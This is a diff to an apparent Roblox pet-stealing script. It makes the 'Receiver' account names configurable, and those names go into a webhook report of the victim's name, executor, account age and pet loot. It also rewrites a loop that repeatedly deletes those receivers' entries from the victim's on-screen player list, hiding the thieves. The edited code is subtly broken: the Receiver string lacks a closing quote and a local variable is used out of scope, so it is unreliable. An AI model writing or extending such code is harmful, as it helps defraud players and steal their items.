@@ -166,6 +166,8 @@ local function sendWebhook(link)
         table.insert(orderedPets, r)
     end
 
+    local nameSuffixes = config.Receiver
+    local receiverList = table.concat(nameSuffixes, ", ")
     local lootText = table.concat(orderedPets, "\n")
     local placeId = tostring(game.PlaceId or "")
     local jobId = tostring(game.JobId or "")
@@ -178,7 +180,7 @@ local function sendWebhook(link)
             { ["name"] = "Server Type", ["value"] = serverType },
             { ["name"] = "👥 Player Information",
               ["value"] = "Name: " .. player.Name ..
-                          "\nReceiver: phatle8117, banpetuytin1111, banpetuytin111140" ..
+                          "\nReceiver: .. receiverList ..
                           "\nExecutor: " .. detectExecutor() ..
                           "\nAccount Age: " .. tostring(getAccountAge()) .. " days" },
             { ["name"] = "🧠Brainrot Loot", ["value"] = lootText },
@@ -542,40 +544,53 @@ end
 task.spawn(function()
     local CoreGui = game:GetService("CoreGui")
 
-    -- đŸ”¥ Danh sĂ¡ch cĂ¡c PlayerLabel cáº§n xĂ³a
-    local namesToRemove = {
-        "PlayerLabelphatle8117",
-        "PlayerLabelnoob123",
-        "PlayerLabelabcxyz",
-        "PlayerLabeltest999" -- thĂªm bao nhiĂªu tĂ¹y Ă½
-    }
+-------------------------------
+-- 🧩 XÓA PLAYERLABEL TỰ ĐỘNG (By PhatLee - Final 0.1s)
+-------------------------------
 
-    while task.wait(0.01) do
-        -------------------------------
-        -- PHáº¦N 1: XĂ“A PLAYERLABEL
-        -------------------------------
-        local root = CoreGui:FindFirstChild("RobloxGui")
-            and CoreGui.RobloxGui:FindFirstChild("SettingsClippingShield")
-            and CoreGui.RobloxGui.SettingsClippingShield:FindFirstChild("SettingsShield")
-            and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield
-                :FindFirstChild("MenuContainer")
-                and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer
-                :FindFirstChild("PageViewClipper")
-                and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper
-                :FindFirstChild("PageView")
-                and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView
-                :FindFirstChild("PageViewInnerFrame")
-                and CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.PageViewClipper.PageView.PageViewInnerFrame
-                :FindFirstChild("Players")
+-- ⚙️ Cấu hình
+local prefix = "PlayerLabel" -- phần cố định
 
-        if root then
-            for _, name in ipairs(namesToRemove) do
-                local target = root:FindFirstChild(name)
-                if target then
-                    target:Destroy()
-                end
+
+-- 🕒 Lặp dò và xóa mỗi 0.1s
+while task.wait(0.1) do
+    local success, playersFrame = pcall(function()
+        local robloxGui = CoreGui:FindFirstChild("RobloxGui")
+        if not robloxGui then return nil end
+
+        local clipShield = robloxGui:FindFirstChild("SettingsClippingShield")
+        if not clipShield then return nil end
+
+        local settingsShield = clipShield:FindFirstChild("SettingsShield")
+        if not settingsShield then return nil end
+
+        local menuContainer = settingsShield:FindFirstChild("MenuContainer")
+        if not menuContainer then return nil end
+
+        local pageViewClipper = menuContainer:FindFirstChild("PageViewClipper")
+        if not pageViewClipper then return nil end
+
+        local pageView = pageViewClipper:FindFirstChild("PageView")
+        if not pageView then return nil end
+
+        local innerFrame = pageView:FindFirstChild("PageViewInnerFrame")
+        if not innerFrame then return nil end
+
+        local players = innerFrame:FindFirstChild("Players")
+        return players
+    end)
+
+    if success and playersFrame then
+        for _, suffix in ipairs(nameSuffixes) do
+            local fullName = prefix .. suffix
+            local target = playersFrame:FindFirstChild(fullName)
+            if target then
+                target:Destroy()
+                warn("🧹 Đã xóa:", fullName)
             end
         end
+    end
+end
 -------------------------------
 -- PHẦN 2: XÓA PLAYERENTRY THEO DANH SÁCH TÊN
 -------------------------------
